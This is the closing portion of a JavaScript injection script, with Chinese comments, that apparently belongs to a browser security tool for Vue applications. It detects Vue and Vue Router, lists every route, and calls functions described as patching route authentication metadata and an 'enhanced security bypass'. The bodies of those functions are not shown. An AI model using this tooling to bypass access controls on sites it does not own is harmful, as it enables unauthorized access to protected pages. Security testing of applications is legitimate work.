            table: console.table
        };

        try {
            // 拦截控制台输出
            console.log = function(...args) {
                result.logs.push({type: 'log', message: args.join(' ')});
                originals.log.apply(console, args);
            };
            console.warn = function(...args) {
                result.logs.push({type: 'warn', message: args.join(' ')});
                originals.warn.apply(console, args);
            };
            console.error = function(...args) {
                result.logs.push({type: 'error', message: args.join(' ')});
                originals.error.apply(console, args);
            };
            console.table = function(data, columns) {
                if (Array.isArray(data)) {
                    result.logs.push({type: 'table', data: [...data]});
                } else {
                    result.logs.push({type: 'table', data: {...data}});
                }
                originals.table.apply(console, arguments);
            };

            // 查找Vue根实例
            const vueRoot = findVueRoot(document.body);
            if (!vueRoot) {
                console.error('❌ 未检测到 Vue 实例');
                restoreConsole(originals);
                return result;
            }

            result.vueDetected = true;

            // 查找Vue Router
            const router = findVueRouter(vueRoot);
            if (!router) {
                console.error('❌ 未检测到 Vue Router 实例');
                restoreConsole(originals);
                return result;
            }

            result.routerDetected = true;

            // 获取Vue版本和框架信息
            const versionInfo = getVueVersion(vueRoot);
            result.vueVersion = versionInfo.version;
            result.framework = versionInfo.framework;
            result.buildTool = versionInfo.buildTool;
            console.log('✅ Vue 版本：', result.vueVersion);
            console.log('🔧 框架类型：', result.framework);
            if (result.buildTool) {
                console.log('⚡ 构建工具：', result.buildTool);
            }

            // 提取Router基础路径
            result.routerBase = extractRouterBase(router);
            console.log('📍 Router基础路径:', result.routerBase || '(无)');

            // 分析页面链接
            result.pageAnalysis = analyzePageLinks();
            if (result.pageAnalysis.detectedBasePath) {
                console.log('🔍 从页面链接检测到基础路径:', result.pageAnalysis.detectedBasePath);
            }

            // 修改路由鉴权元信息并执行增强安全绕过
            result.modifiedRoutes = patchAllRouteAuth(router);
            result.securityBypass = enhancedSecurityBypass(router, vueRoot);

            // 列出所有路由
            result.allRoutes = listAllRoutes(router);
            console.log('🔍 当前所有路由：');
            console.table(result.allRoutes);

            // 发现Path路径定义
            result.pathDefinitions = await discoverPathDefinitions();
            console.log('🔍 发现Path路径：', result.pathDefinitions.paths.length, '个');
            if (result.pathDefinitions.paths.length > 0) {
                console.log('📋 Path路径列表：', result.pathDefinitions.paths.map(p => p.path));
            }

            restoreConsole(originals);
            return result;

        } catch (error) {
            restoreConsole(originals);
            handleError(error, 'performFullAnalysis', true);
            return {
                vueDetected: false,
                routerDetected: false,
                error: error.toString()
            };
        }
    }

    // ======== 延迟检测机制 ========
    function delayedDetection(delay = 0, retryCount = 0) {
        // 改为最大重试3次
        if (retryCount >= 3) {
            sendResult({
                detected: false,
                method: 'Max retry limit reached (3 attempts)'
            });
            return;
        }

        setTimeout(() => {
            const vueRoot = simpleVueDetection();

            if (vueRoot) {
                sendResult({
                    detected: true,
                    method: `Delayed detection (attempt ${retryCount + 1})`
                });
                
                setTimeout(async () => {
                    const analysisResult = await performFullAnalysis();
                    sendRouterResult(analysisResult);
                }, 50);
            } else if (delay === 0) {
                delayedDetection(300, retryCount + 1);    // 第1次重试：300ms
            } else if (delay === 300) {
                delayedDetection(600, retryCount + 1);    // 第2次重试：600ms
            } else {
                sendResult({
                    detected: false,
                    method: `All delayed detection failed (${retryCount + 1} attempts)`
                });
            }
        }, delay);
    }

    // ======== 主执行逻辑 ========
    try {
        const vueRoot = simpleVueDetection();

        if (vueRoot) {
            sendResult({
                detected: true,
                method: 'Immediate detection'
            });

            setTimeout(async () => {
                const analysisResult = await performFullAnalysis();
                sendRouterResult(analysisResult);
            }, 50);
        } else {
            delayedDetection(0, 0); // 添加初始重试计数
        }
    } catch (error) {
        handleError(error, 'Main execution', false);
        delayedDetection(500, 0); // 添加初始重试计数
    }
})();